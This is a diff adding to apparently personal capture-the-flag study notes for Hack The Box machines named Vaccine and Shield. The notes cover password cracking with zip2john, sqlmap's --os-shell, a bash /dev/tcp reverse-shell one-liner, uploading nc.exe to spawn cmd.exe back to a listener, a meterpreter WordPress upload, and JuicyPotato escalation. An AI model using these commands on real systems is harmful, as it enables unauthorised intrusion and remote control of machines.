@@ -24,3 +24,28 @@ xp_cmdshell "whoami";
 
 ## Powershell
 Powershell history file: `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.tx`
+
+# Vaccine
+Use `zip2john` to brute force attack password protected Zip files
+
+Use www.cractstation.net for rainbow tables for known passwords
+
+## SQL
+- If using `sqlmap` and attacking a postgreSQL DB, use `--os-shell` to attempt to get shell
+- If you have OS Shell, run `bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'` to get reverse shell (requires `nc` listener)
+
+# Shield
+- `gobuster` is an alternative to brute force open directories for a web app
+- Can use `wp_admin_shell_upload` to get a meterpreter shell
+- Upload the `nc.exe` executable and then execute it with `execute -f nc.exe -a "-e cmd.exe IP_ADDR LIST_PORT"`
+- `JuicyPotato` to escalate privs
+
+# Pathfinder
+
+# Included
+
+# Markup - on this one
+
+# Guard
+
+# Base
